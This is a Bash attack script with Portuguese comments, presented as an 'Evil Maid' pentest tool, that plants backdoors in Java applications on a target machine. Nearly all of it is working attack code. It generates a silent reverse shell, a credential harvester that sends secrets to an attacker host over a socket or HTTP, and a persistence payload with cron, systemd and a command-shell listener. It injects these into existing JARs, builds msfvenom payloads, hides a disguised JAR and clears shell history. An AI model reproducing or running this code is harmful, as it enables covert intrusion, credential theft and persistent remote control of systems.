#!/bin/bash
# jvm_backdoor.sh - Injeta backdoors em aplicações Java
# Evil Maid Pentest - Compromisso de aplicações JVM
# Uso: sudo ./jvm_backdoor.sh [jvm_partition_path]

set -e

# Configuração de cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configurações globais
WORK_DIR="/tmp/evil_jvm_$$"
BACKUP_DIR="/tmp/jvm_backups"
LOG_FILE="/tmp/jvm_backdoor.log"
PAYLOAD_DIR="/tmp/java_payloads"

# Banner
show_banner() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                           Evil Maid JVM Backdoor                              ║"
    echo "║                    Java Application Compromise Suite                          ║"
    echo "║                                                                              ║"
    echo "║  🎯 Target: Java applications and JAR files                                ║"
    echo "║  ⚔️  Method: Bytecode injection and code modification                       ║"
    echo "║  📡 Payload: Reverse shells and credential harvesting                       ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Função de log
log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")  echo -e "${GREEN}[INFO]${NC} $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC} $message" ;;
        "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
        "DEBUG") echo -e "${BLUE}[DEBUG]${NC} $message" ;;
        "SUCCESS") echo -e "${GREEN}[SUCCESS]${NC} $message" ;;
        "FINDING") echo -e "${PURPLE}[FINDING]${NC} $message" ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Verificar dependências
check_dependencies() {
    log "INFO" "Verificando dependências..."
    
    local deps=("unzip" "zip" "file" "grep" "find")
    local missing_deps=()
    local optional_deps=("javac" "jar" "msfvenom")
    
    # Dependências obrigatórias
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            missing_deps+=("$dep")
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        log "ERROR" "Dependências obrigatórias não encontradas: ${missing_deps[*]}"
        echo "Instale com: apt-get install unzip zip file grep findutils"
        exit 1
    fi
    
    # Dependências opcionais
    echo -e "\n${BLUE}[+] Verificando dependências opcionais:${NC}"
    for dep in "${optional_deps[@]}"; do
        if command -v "$dep" >/dev/null 2>&1; then
            echo "    ✓ $dep disponível"
        else
            echo "    ⚠️  $dep não encontrado (funcionalidade limitada)"
        fi
    done
    
    log "SUCCESS" "Verificação de dependências concluída"
}

# Detectar partição JVM
detect_jvm_partition() {
    log "INFO" "Detectando partições JVM..."
    
    local candidates=(
        "/mnt/evil_target/jvm"
        "/mnt/jvm"
        "/opt/java"
        "/usr/share/java"
        "/var/lib/java"
    )
    
    # Procurar também em partições montadas
    for mount_point in /mnt/*; do
        if [[ -d "$mount_point" ]]; then
            candidates+=("$mount_point")
        fi
    done
    
    local found_paths=()
    
    for candidate in "${candidates[@]}"; do
        if [[ -d "$candidate" ]]; then
            # Verificar se contém arquivos JAR
            local jar_count=$(find "$candidate" -name "*.jar" -type f 2>/dev/null | wc -l)
            if [[ $jar_count -gt 0 ]]; then
                found_paths+=("$candidate ($jar_count JARs)")
            fi
        fi
    done
    
    if [[ ${#found_paths[@]} -eq 0 ]]; then
        log "ERROR" "Nenhuma partição JVM encontrada"
        return 1
    fi
    
    echo -e "\n${GREEN}[+] Partições JVM Encontradas:${NC}"
    for i in "${!found_paths[@]}"; do
        echo "    [$((i+1))] ${found_paths[$i]}"
    done
    
    # Retornar o primeiro caminho encontrado
    echo "${found_paths[0]}" | cut -d'(' -f1 | xargs
}

# Análise de segurança de arquivos JAR
analyze_jar_security() {
    local jar_file="$1"
    local extract_dir="$2"
    
    log "INFO" "Analisando segurança do JAR: $(basename "$jar_file")"
    
    # Extrair JAR
    mkdir -p "$extract_dir"
    unzip -q "$jar_file" -d "$extract_dir" 2>/dev/null || {
        log "ERROR" "Falha ao extrair JAR: $jar_file"
        return 1
    }
    
    local findings=()
    
    # 1. Procurar por credenciais em arquivos de configuração
    log "DEBUG" "Procurando credenciais em arquivos de configuração..."
    
    find "$extract_dir" -type f \( -name "*.properties" -o -name "*.xml" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) | while read -r config_file; do
        local secrets=$(grep -i -E "(password|secret|key|token|jdbc|api_key|private_key)" "$config_file" 2>/dev/null | head -5)
        if [[ -n "$secrets" ]]; then
            log "FINDING" "Credenciais em $(basename "$config_file"):"
            echo "$secrets" | while read -r line; do
                log "FINDING" "  → $line"
            done
        fi
    done
    
    # 2. Análise do MANIFEST.MF
    local manifest="$extract_dir/META-INF/MANIFEST.MF"
    if [[ -f "$manifest" ]]; then
        log "DEBUG" "Analisando MANIFEST.MF..."
        
        local main_class=$(grep "Main-Class:" "$manifest" 2>/dev/null | cut -d':' -f2 | xargs)
        if [[ -n "$main_class" ]]; then
            log "FINDING" "Classe principal: $main_class"
            findings+=("main_class:$main_class")
        fi
        
        local classpath=$(grep "Class-Path:" "$manifest" 2>/dev/null | cut -d':' -f2 | xargs)
        if [[ -n "$classpath" ]]; then
            log "FINDING" "Classpath: $classpath"
        fi
        
        # Verificar assinatura digital
        if grep -q "SHA.*Digest" "$manifest" 2>/dev/null; then
            log "WARN" "JAR assinado digitalmente - modificação pode ser detectada"
            findings+=("signed:true")
        else
            log "INFO" "JAR não assinado - modificação segura"
            findings+=("signed:false")
        fi
    fi
    
    # 3. Procurar por pontos de entrada (métodos main)
    log "DEBUG" "Procurando pontos de entrada..."
    
    find "$extract_dir" -name "*.class" -type f | while read -r class_file; do
        # Usar strings para procurar por assinaturas de método main
        if strings "$class_file" 2>/dev/null | grep -q "main([Ljava/lang/String;)V"; then
            local class_name=$(echo "$class_file" | sed "s|$extract_dir/||" | sed 's|/|.|g' | sed 's|.class$||')
            log "FINDING" "Método main encontrado: $class_name"
            findings+=("entry_point:$class_name")
        fi
    done
    
    # 4. Análise de bibliotecas perigosas
    log "DEBUG" "Procurando bibliotecas perigosas..."
    
    local dangerous_libs=(
        "java/net/Socket"
        "java/io/File"
        "java/lang/Runtime"
        "java/lang/Process"
        "javax/crypto"
        "java/security"
    )
    
    for lib in "${dangerous_libs[@]}"; do
        if find "$extract_dir" -name "*.class" -exec strings {} \; 2>/dev/null | grep -q "$lib"; then
            log "FINDING" "Biblioteca perigosa detectada: $lib"
            findings+=("dangerous_lib:$lib")
        fi
    done
    
    # 5. Procurar por configurações de rede
    log "DEBUG" "Procurando configurações de rede..."
    
    find "$extract_dir" -type f \( -name "*.properties" -o -name "*.xml" -o -name "*.json" \) -exec grep -l -i -E "(host|port|url|endpoint)" {} \; | while read -r net_file; do
        local net_configs=$(grep -i -E "(host|port|url|endpoint)" "$net_file" | head -3)
        if [[ -n "$net_configs" ]]; then
            log "FINDING" "Configuração de rede em $(basename "$net_file"):"
            echo "$net_configs" | while read -r line; do
                log "FINDING" "  → $line"
            done
        fi
    done
    
    # Retornar findings
    printf '%s\n' "${findings[@]}"
}

# Criar payload Java reverso
create_java_payload() {
    local payload_type="$1"
    local output_file="$2"
    local attacker_ip="${3:-192.168.1.100}"
    local attacker_port="${4:-4444}"
    
    log "INFO" "Criando payload Java: $payload_type"
    
    case "$payload_type" in
        "reverse_shell")
            cat > "$output_file" << EOF
import java.io.*;
import java.net.*;

public class EvilPayload {
    static {
        try {
            // Executar na inicialização da classe
            new Thread(new Runnable() {
                public void run() {
                    try {
                        reverseShell("$attacker_ip", $attacker_port);
                    } catch (Exception e) {
                        // Falhar silenciosamente
                    }
                }
            }).start();
        } catch (Exception e) {
            // Falhar silenciosamente
        }
    }
    
    public static void reverseShell(String host, int port) throws Exception {
        Socket socket = new Socket(host, port);
        Process process = Runtime.getRuntime().exec("/bin/bash");
        
        InputStream processInput = process.getInputStream();
        InputStream processError = process.getErrorStream();
        OutputStream processOutput = process.getOutputStream();
        
        InputStream socketInput = socket.getInputStream();
        OutputStream socketOutput = socket.getOutputStream();
        
        // Thread para enviar dados do processo para o socket
        new Thread(new Runnable() {
            public void run() {
                try {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = processInput.read(buffer)) != -1) {
                        socketOutput.write(buffer, 0, bytesRead);
                        socketOutput.flush();
                    }
                } catch (Exception e) {}
            }
        }).start();
        
        // Thread para enviar erros do processo para o socket
        new Thread(new Runnable() {
            public void run() {
                try {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = processError.read(buffer)) != -1) {
                        socketOutput.write(buffer, 0, bytesRead);
                        socketOutput.flush();
                    }
                } catch (Exception e) {}
            }
        }).start();
        
        // Thread principal para enviar dados do socket para o processo
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = socketInput.read(buffer)) != -1) {
            processOutput.write(buffer, 0, bytesRead);
            processOutput.flush();
        }
        
        process.destroy();
        socket.close();
    }
    
    // Método principal para testar
    public static void main(String[] args) {
        System.out.println("Sistema inicializado");
    }
}
EOF
            ;;
            
        "credential_harvester")
            cat > "$output_file" << EOF
import java.io.*;
import java.net.*;
import java.util.*;
import java.security.*;

public class CredentialHarvester {
    private static final String LOG_FILE = "/tmp/.java_creds";
    private static final String EXFIL_SERVER = "$attacker_ip";
    private static final int EXFIL_PORT = $attacker_port;
    
    static {
        try {
            // Iniciar harvester na carga da classe
            new Thread(new CredentialHarvester()::harvest).start();
        } catch (Exception e) {
            // Falhar silenciosamente
        }
    }
    
    public void harvest() {
        try {
            // 1. Coletar propriedades do sistema
            harvestSystemProperties();
            
            // 2. Coletar variáveis de ambiente
            harvestEnvironmentVariables();
            
            // 3. Procurar arquivos de configuração
            harvestConfigFiles();
            
            // 4. Tentar exfiltrar dados
            exfiltrateData();
            
        } catch (Exception e) {
            // Log erro silenciosamente
            logError(e.getMessage());
        }
    }
    
    private void harvestSystemProperties() {
        try {
            PrintWriter writer = new PrintWriter(new FileWriter(LOG_FILE, true));
            writer.println("=== SYSTEM PROPERTIES ===");
            writer.println("Timestamp: " + new Date());
            
            Properties props = System.getProperties();
            for (Object key : props.keySet()) {
                String keyStr = key.toString();
                if (keyStr.toLowerCase().contains("password") || 
                    keyStr.toLowerCase().contains("secret") ||
                    keyStr.toLowerCase().contains("key")) {
                    writer.println(keyStr + "=" + props.getProperty(keyStr));
                }
            }
            writer.println();
            writer.close();
        } catch (Exception e) {}
    }
    
    private void harvestEnvironmentVariables() {
        try {
            PrintWriter writer = new PrintWriter(new FileWriter(LOG_FILE, true));
            writer.println("=== ENVIRONMENT VARIABLES ===");
            
            Map<String, String> env = System.getenv();
            for (String key : env.keySet()) {
                if (key.toLowerCase().contains("password") || 
                    key.toLowerCase().contains("secret") ||
                    key.toLowerCase().contains("key") ||
                    key.toLowerCase().contains("token")) {
                    writer.println(key + "=" + env.get(key));
                }
            }
            writer.println();
            writer.close();
        } catch (Exception e) {}
    }
    
    private void harvestConfigFiles() {
        try {
            PrintWriter writer = new PrintWriter(new FileWriter(LOG_FILE, true));
            writer.println("=== CONFIG FILES ===");
            
            // Procurar em diretórios comuns
            String[] searchDirs = {
                System.getProperty("user.home"),
                System.getProperty("user.dir"),
                "/etc",
                "/opt"
            };
            
            for (String dir : searchDirs) {
                scanDirectory(new File(dir), writer);
            }
            
            writer.println();
            writer.close();
        } catch (Exception e) {}
    }
    
    private void scanDirectory(File dir, PrintWriter writer) {
        if (dir == null || !dir.exists() || !dir.isDirectory()) return;
        
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isFile()) {
                String name = file.getName().toLowerCase();
                if (name.endsWith(".properties") || 
                    name.endsWith(".config") || 
                    name.endsWith(".conf") ||
                    name.contains("password") ||
                    name.contains("secret")) {
                    
                    try {
                        writer.println("Found config file: " + file.getAbsolutePath());
                        // Ler primeiras linhas do arquivo
                        BufferedReader reader = new BufferedReader(new FileReader(file));
                        for (int i = 0; i < 5; i++) {
                            String line = reader.readLine();
                            if (line == null) break;
                            if (line.toLowerCase().contains("password") || 
                                line.toLowerCase().contains("secret")) {
                                writer.println("  " + line);
                            }
                        }
                        reader.close();
                    } catch (Exception e) {}
                }
            }
        }
    }
    
    private void exfiltrateData() {
        try {
            // Tentar enviar dados coletados
            Socket socket = new Socket(EXFIL_SERVER, EXFIL_PORT);
            
            BufferedReader fileReader = new BufferedReader(new FileReader(LOG_FILE));
            PrintWriter socketWriter = new PrintWriter(socket.getOutputStream());
            
            socketWriter.println("=== JAVA CREDENTIAL HARVEST ===");
            String line;
            while ((line = fileReader.readLine()) != null) {
                socketWriter.println(line);
            }
            
            fileReader.close();
            socketWriter.close();
            socket.close();
            
        } catch (Exception e) {
            // Se falhar, tentar método alternativo (HTTP)
            tryHttpExfiltration();
        }
    }
    
    private void tryHttpExfiltration() {
        try {
            URL url = new URL("http://" + EXFIL_SERVER + ":8080/upload");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            BufferedReader fileReader = new BufferedReader(new FileReader(LOG_FILE));
            PrintWriter writer = new PrintWriter(conn.getOutputStream());
            
            String line;
            while ((line = fileReader.readLine()) != null) {
                writer.println(line);
            }
            
            fileReader.close();
            writer.close();
            
            // Ler resposta para evitar timeout
            conn.getInputStream().close();
            
        } catch (Exception e) {}
    }
    
    private void logError(String error) {
        try {
            PrintWriter writer = new PrintWriter(new FileWriter(LOG_FILE, true));
            writer.println("ERROR: " + error + " at " + new Date());
            writer.close();
        } catch (Exception e) {}
    }
}
EOF
            ;;
            
        "persistence")
            cat > "$output_file" << EOF
import java.io.*;
import java.net.*;
import java.util.concurrent.*;

public class PersistencePayload {
    private static final String BACKDOOR_FILE = "/tmp/.java_backdoor";
    private static final int LISTEN_PORT = $attacker_port;
    private static ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
    
    static {
        try {
            // Instalar persistência na inicialização
            installPersistence();
            startBackdoorService();
        } catch (Exception e) {
            // Falhar silenciosamente
        }
    }
    
    private static void installPersistence() {
        try {
            // Criar script de persistência
            String script = "#!/bin/bash\n" +
                          "while true; do\n" +
                          "  if ! pgrep -f 'java.*EvilPayload' > /dev/null; then\n" +
                          "    nohup java -cp /tmp EvilPayload &\n" +
                          "  fi\n" +
                          "  sleep 300\n" +
                          "done\n";
            
            PrintWriter writer = new PrintWriter(BACKDOOR_FILE);
            writer.print(script);
            writer.close();
            
            // Tornar executável
            Runtime.getRuntime().exec("chmod +x " + BACKDOOR_FILE);
            
            // Tentar instalar no crontab
            installCronJob();
            
            // Tentar criar serviço systemd
            installSystemdService();
            
        } catch (Exception e) {}
    }
    
    private static void installCronJob() {
        try {
            ProcessBuilder pb = new ProcessBuilder("crontab", "-l");
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder crontab = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                crontab.append(line).append("\\n");
            }
            
            // Adicionar nossa entrada se não existir
            String ourJob = "@reboot " + BACKDOOR_FILE;
            if (!crontab.toString().contains(BACKDOOR_FILE)) {
                crontab.append(ourJob).append("\\n");
                
                // Instalar novo crontab
                ProcessBuilder installPb = new ProcessBuilder("crontab", "-");
                Process installProcess = installPb.start();
                
                PrintWriter writer = new PrintWriter(installProcess.getOutputStream());
                writer.print(crontab.toString());
                writer.close();
                
                installProcess.waitFor();
            }
            
        } catch (Exception e) {}
    }
    
    private static void installSystemdService() {
        try {
            String service = "[Unit]\\n" +
                           "Description=Java System Monitor\\n" +
                           "After=network.target\\n\\n" +
                           "[Service]\\n" +
                           "Type=simple\\n" +
                           "ExecStart=" + BACKDOOR_FILE + "\\n" +
                           "Restart=always\\n" +
                           "User=root\\n\\n" +
                           "[Install]\\n" +
                           "WantedBy=multi-user.target\\n";
            
            PrintWriter writer = new PrintWriter("/etc/systemd/system/java-monitor.service");
            writer.print(service);
            writer.close();
            
            // Habilitar serviço
            Runtime.getRuntime().exec("systemctl daemon-reload");
            Runtime.getRuntime().exec("systemctl enable java-monitor.service");
            
        } catch (Exception e) {}
    }
    
    private static void startBackdoorService() {
        // Iniciar servidor de backdoor em thread separada
        scheduler.schedule(new Runnable() {
            public void run() {
                try {
                    ServerSocket server = new ServerSocket(LISTEN_PORT);
                    
                    while (true) {
                        Socket client = server.accept();
                        
                        // Processar conexão em thread separada
                        scheduler.submit(new Runnable() {
                            public void run() {
                                handleBackdoorConnection(client);
                            }
                        });
                    }
                } catch (Exception e) {}
            }
        }, 5, TimeUnit.SECONDS);
    }
    
    private static void handleBackdoorConnection(Socket client) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter writer = new PrintWriter(client.getOutputStream(), true);
            
            writer.println("Java Backdoor Ready");
            
            String command;
            while ((command = reader.readLine()) != null) {
                if (command.equals("exit")) {
                    break;
                }
                
                try {
                    Process process = Runtime.getRuntime().exec(command);
                    BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    
                    String line;
                    while ((line = processReader.readLine()) != null) {
                        writer.println(line);
                    }
                    
                    writer.println("Command completed with exit code: " + process.waitFor());
                    
                } catch (Exception e) {
                    writer.println("Error executing command: " + e.getMessage());
                }
            }
            
            client.close();
            
        } catch (Exception e) {}
    }
}
EOF
            ;;
    esac
    
    log "SUCCESS" "Payload Java criado: $output_file"
}

# Compilar payload Java
compile_java_payload() {
    local source_file="$1"
    local class_file="${source_file%.java}.class"
    
    if command -v javac >/dev/null 2>&1; then
        log "INFO" "Compilando payload Java..."
        
        if javac "$source_file" 2>/dev/null; then
            log "SUCCESS" "Payload compilado: $class_file"
            echo "$class_file"
            return 0
        else
            log "WARN" "Falha na compilação, usando msfvenom como alternativa..."
        fi
    fi
    
    # Alternativa com msfvenom se javac não disponível
    if command -v msfvenom >/dev/null 2>&1; then
        local jar_file="${source_file%.java}.jar"
        log "INFO" "Gerando payload com msfvenom..."
        
        msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f jar -o "$jar_file" 2>/dev/null
        
        if [[ -f "$jar_file" ]]; then
            log "SUCCESS" "Payload msfvenom gerado: $jar_file"
            echo "$jar_file"
            return 0
        fi
    fi
    
    log "ERROR" "Não foi possível compilar ou gerar payload"
    return 1
}

# Injetar payload em JAR existente
inject_payload_into_jar() {
    local jar_file="$1"
    local payload_class="$2"
    local technique="$3"
    
    log "INFO" "Injetando payload no JAR: $(basename "$jar_file")"
    
    local extract_dir="$WORK_DIR/inject_$(basename "$jar_file" .jar)"
    local backup_jar="$BACKUP_DIR/$(basename "$jar_file").backup.$(date +%s)"
    
    # Criar backup
    mkdir -p "$BACKUP_DIR"
    cp "$jar_file" "$backup_jar"
    log "SUCCESS" "Backup criado: $backup_jar"
    
    # Extrair JAR original
    mkdir -p "$extract_dir"
    unzip -q "$jar_file" -d "$extract_dir" 2>/dev/null || {
        log "ERROR" "Falha ao extrair JAR para injeção"
        return 1
    }
    
    case "$technique" in
        "class_replacement")
            # Substituir classe principal
            log "INFO" "Técnica: Substituição de classe"
            
            local manifest="$extract_dir/META-INF/MANIFEST.MF"
            if [[ -f "$manifest" ]]; then
                local main_class=$(grep "Main-Class:" "$manifest" | cut -d':' -f2 | xargs)
                if [[ -n "$main_class" ]]; then
                    local class_path="$extract_dir/${main_class//./\/}.class"
                    if [[ -f "$class_path" ]]; then
                        # Backup da classe original
                        cp "$class_path" "$class_path.orig"
                        # Substituir pela nossa classe maliciosa
                        cp "$payload_class" "$class_path"
                        log "SUCCESS" "Classe principal substituída: $main_class"
                    fi
                fi
            fi
            ;;
            
        "class_injection")
            # Injetar nova classe
            log "INFO" "Técnica: Injeção de classe"
            
            cp "$payload_class" "$extract_dir/"
            
            # Modificar MANIFEST para carregar nossa classe
            local manifest="$extract_dir/META-INF/MANIFEST.MF"
            if [[ -f "$manifest" ]]; then
                echo "Pre-Main-Class: $(basename "$payload_class" .class)" >> "$manifest"
                log "SUCCESS" "Classe injetada com Pre-Main-Class"
            fi
            ;;
            
        "static_initializer")
            # Modificar classe existente para incluir inicializador estático
            log "INFO" "Técnica: Inicializador estático"
            
            # Esta técnica requereria engenharia reversa de bytecode
            # Por simplicidade, vamos apenas injetar a classe
            cp "$payload_class" "$extract_dir/"
            log "SUCCESS" "Classe injetada para inicialização estática"
            ;;
    esac
    
    # Recompactar JAR
    log "INFO" "Recompactando JAR modificado..."
    
    cd "$extract_dir"
    zip -r -q "$jar_file" . 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        local original_size=$(du -h "$backup_jar" | cut -f1)
        local new_size=$(du -h "$jar_file" | cut -f1)
        log "SUCCESS" "JAR modificado: $original_size → $new_size"
        return 0
    else
        log "ERROR" "Falha ao recompactar JAR"
        # Restaurar backup
        cp "$backup_jar" "$jar_file"
        return 1
    fi
}

# Criar JAR malicioso standalone
create_malicious_jar() {
    local output_jar="$1"
    local payload_type="$2"
    
    log "INFO" "Criando JAR malicioso standalone..."
    
    local jar_dir="$WORK_DIR/malicious_jar"
    mkdir -p "$jar_dir"
    
    # Criar payload Java
    local payload_source="$jar_dir/EvilPayload.java"
    create_java_payload "$payload_type" "$payload_source"
    
    # Compilar payload
    local compiled_payload=$(compile_java_payload "$payload_source")
    if [[ $? -ne 0 ]]; then
        log "ERROR" "Falha ao compilar payload"
        return 1
    fi
    
    # Criar MANIFEST
    mkdir -p "$jar_dir/META-INF"
    cat > "$jar_dir/META-INF/MANIFEST.MF" << EOF
Manifest-Version: 1.0
Main-Class: EvilPayload
Created-By: Evil Maid Framework
Implementation-Title: System Utilities
Implementation-Version: 1.0
EOF
    
    # Criar JAR
    cd "$jar_dir"
    if command -v jar >/dev/null 2>&1; then
        jar cfm "$output_jar" META-INF/MANIFEST.MF *.class 2>/dev/null
    else
        zip -r "$output_jar" . 2>/dev/null
    fi
    
    if [[ -f "$output_jar" ]]; then
        log "SUCCESS" "JAR malicioso criado: $output_jar"
        return 0
    else
        log "ERROR" "Falha ao criar JAR malicioso"
        return 1
    fi
}

# Análise forense de JAR
forensic_analysis() {
    local jar_file="$1"
    
    log "INFO" "Executando análise forense do JAR..."
    
    echo -e "\n${PURPLE}[🔍] ANÁLISE FORENSE: $(basename "$jar_file")${NC}"
    
    # Informações básicas do arquivo
    echo -e "\n📊 Informações básicas:"
    echo "    Tamanho: $(du -h "$jar_file" | cut -f1)"
    echo "    Tipo: $(file "$jar_file")"
    echo "    MD5: $(md5sum "$jar_file" | cut -d' ' -f1)"
    echo "    SHA256: $(sha256sum "$jar_file" | cut -d' ' -f1)"
    
    # Análise de conteúdo
    local temp_extract="$WORK_DIR/forensic_$(basename "$jar_file" .jar)"
    mkdir -p "$temp_extract"
    
    if unzip -q "$jar_file" -d "$temp_extract" 2>/dev/null; then
        echo -e "\n📁 Conteúdo do JAR:"
        echo "    Classes: $(find "$temp_extract" -name "*.class" | wc -l)"
        echo "    Recursos: $(find "$temp_extract" -type f ! -name "*.class" | wc -l)"
        echo "    Diretórios: $(find "$temp_extract" -type d | wc -l)"
        
        # Análise do MANIFEST
        local manifest="$temp_extract/META-INF/MANIFEST.MF"
        if [[ -f "$manifest" ]]; then
            echo -e "\n📜 MANIFEST.MF:"
            cat "$manifest" | head -10 | sed 's/^/    /'
        fi
        
        # Strings suspeitas
        echo -e "\n🚨 Strings suspeitas:"
        find "$temp_extract" -name "*.class" -exec strings {} \; 2>/dev/null | \
            grep -i -E "(password|secret|backdoor|shell|reverse|connect|socket)" | \
            head -5 | sed 's/^/    /'
        
        rm -rf "$temp_extract"
    fi
}

# Executar análise completa de partição JVM
analyze_jvm_partition() {
    local jvm_path="$1"
    
    log "INFO" "Executando análise completa da partição JVM: $jvm_path"
    
    if [[ ! -d "$jvm_path" ]]; then
        log "ERROR" "Caminho JVM não existe: $jvm_path"
        return 1
    fi
    
    echo -e "\n${GREEN}[+] ANÁLISE DA PARTIÇÃO JVM${NC}"
    echo "    Caminho: $jvm_path"
    
    # Estatísticas gerais
    local total_jars=$(find "$jvm_path" -name "*.jar" -type f 2>/dev/null | wc -l)
    local total_wars=$(find "$jvm_path" -name "*.war" -type f 2>/dev/null | wc -l)
    local total_ears=$(find "$jvm_path" -name "*.ear" -type f 2>/dev/null | wc -l)
    
    echo "    📊 Estatísticas:"
    echo "       JARs: $total_jars"
    echo "       WARs: $total_wars"
    echo "       EARs: $total_ears"
    
    # Analisar JARs mais promissores
    echo -e "\n🎯 Analisando JARs (top 10 por tamanho):"
    
    find "$jvm_path" -name "*.jar" -type f -exec ls -lh {} \; 2>/dev/null | \
        sort -k5 -hr | head -10 | while read -r line; do
        
        local jar_file=$(echo "$line" | awk '{print $NF}')
        local jar_size=$(echo "$line" | awk '{print $5}')
        
        echo "    📦 $(basename "$jar_file") ($jar_size)"
        
        # Análise rápida de segurança
        local extract_dir="$WORK_DIR/quick_$(basename "$jar_file" .jar)"
        local findings=$(analyze_jar_security "$jar_file" "$extract_dir" 2>/dev/null)
        
        if [[ -n "$findings" ]]; then
            echo "$findings" | while read -r finding; do
                if [[ -n "$finding" ]]; then
                    echo "       └─ $finding"
                fi
            done
        fi
        
        # Limpeza
        rm -rf "$extract_dir" 2>/dev/null
    done
    
    return 0
}

# Criar relatório de análise
create_analysis_report() {
    local jvm_path="$1"
    local report_file="$WORK_DIR/jvm_analysis_report.json"
    
    log "INFO" "Gerando relatório de análise JVM..."
    
    # Coletar dados para o relatório
    local jar_files=()
    while IFS= read -r -d '' jar; do
        jar_files+=("$jar")
    done < <(find "$jvm_path" -name "*.jar" -type f -print0 2>/dev/null)
    
    # Gerar JSON
    cat > "$report_file" << EOF
{
  "jvm_analysis_report": {
    "timestamp": "$(date -Iseconds)",
    "target_path": "$jvm_path",
    "statistics": {
      "total_jars": ${#jar_files[@]},
      "total_wars": $(find "$jvm_path" -name "*.war" -type f 2>/dev/null | wc -l),
      "total_ears": $(find "$jvm_path" -name "*.ear" -type f 2>/dev/null | wc -l)
    },
    "analyzed_jars": [
EOF
    
    local first=true
    for jar in "${jar_files[@]}"; do
        if [[ "$first" == "true" ]]; then
            first=false
        else
            echo "," >> "$report_file"
        fi
        
        local size=$(stat -c%s "$jar" 2>/dev/null || echo "0")
        local md5=$(md5sum "$jar" 2>/dev/null | cut -d' ' -f1 || echo "unknown")
        
        cat >> "$report_file" << EOF
      {
        "file": "$jar",
        "size": $size,
        "md5": "$md5",
        "modifiable": $([ -w "$jar" ] && echo "true" || echo "false")
      }EOF
    done
    
    cat >> "$report_file" << EOF

    ],
    "attack_recommendations": [
      "Inject reverse shell payload into largest JAR files",
      "Replace main classes with malicious alternatives", 
      "Create standalone malicious JARs",
      "Modify configuration files for credential harvesting"
    ]
  }
}
EOF
    
    log "SUCCESS" "Relatório gerado: $report_file"
    echo -e "\n${BLUE}[📋] Relatório salvo em: $report_file${NC}"
}

# Limpeza
cleanup() {
    log "INFO" "Executando limpeza..."
    
    if [[ -d "$WORK_DIR" ]] && [[ "$WORK_DIR" != "/" ]] && [[ "$WORK_DIR" == *"evil_jvm"* ]]; then
        rm -rf "$WORK_DIR"
        log "SUCCESS" "Diretório temporário removido"
    fi
    
    # Limpar histórico
    history -c 2>/dev/null || true
}

# Função principal
main() {
    local jvm_path="$1"
    local action="${2:-analyze}"
    
    show_banner
    check_dependencies
    
    # Detectar partição JVM se não especificada
    if [[ -z "$jvm_path" ]]; then
        jvm_path=$(detect_jvm_partition)
        if [[ $? -ne 0 ]]; then
            log "ERROR" "Não foi possível detectar partição JVM"
            exit 1
        fi
    fi
    
    # Criar diretórios de trabalho
    mkdir -p "$WORK_DIR" "$BACKUP_DIR" "$PAYLOAD_DIR"
    
    log "INFO" "Iniciando análise JVM: $jvm_path"
    
    case "$action" in
        "analyze")
            analyze_jvm_partition "$jvm_path"
            create_analysis_report "$jvm_path"
            ;;
            
        "inject")
            log "INFO" "Modo injeção ativado"
            
            # Encontrar JARs para injetar
            local target_jars=()
            while IFS= read -r -d '' jar; do
                target_jars+=("$jar")
            done < <(find "$jvm_path" -name "*.jar" -type f -writable -print0 2>/dev/null)
            
            if [[ ${#target_jars[@]} -eq 0 ]]; then
                log "WARN" "Nenhum JAR modificável encontrado"
                exit 1
            fi
            
            echo -e "\n${GREEN}[+] JARs modificáveis encontrados: ${#target_jars[@]}${NC}"
            
            # Injetar payload nos primeiros 3 JARs
            for i in "${!target_jars[@]}"; do
                if [[ $i -ge 3 ]]; then break; fi
                
                local jar="${target_jars[$i]}"
                log "INFO" "Injetando payload em: $(basename "$jar")"
                
                # Criar payload
                local payload_source="$PAYLOAD_DIR/EvilPayload_$i.java"
                create_java_payload "reverse_shell" "$payload_source"
                
                local payload_class=$(compile_java_payload "$payload_source")
                if [[ -n "$payload_class" ]]; then
                    inject_payload_into_jar "$jar" "$payload_class" "class_injection"
                fi
            done
            
            # Criar JAR malicioso standalone
            local malicious_jar="$jvm_path/.system_update.jar"
            create_malicious_jar "$malicious_jar" "persistence"
            
            log "SUCCESS" "Injeção de backdoors JVM concluída"
            ;;
            
        "forensic")
            log "INFO" "Modo análise forense ativado"
            
            find "$jvm_path" -name "*.jar" -type f | head -5 | while read -r jar; do
                forensic_analysis "$jar"
            done
            ;;
            
        *)
            log "ERROR" "Ação não reconhecida: $action"
            echo "Uso: $0 [jvm_path] [analyze|inject|forensic]"
            exit 1
            ;;
    esac
    
    cleanup
}

# Trap para limpeza
trap cleanup EXIT

# Executar se chamado diretamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi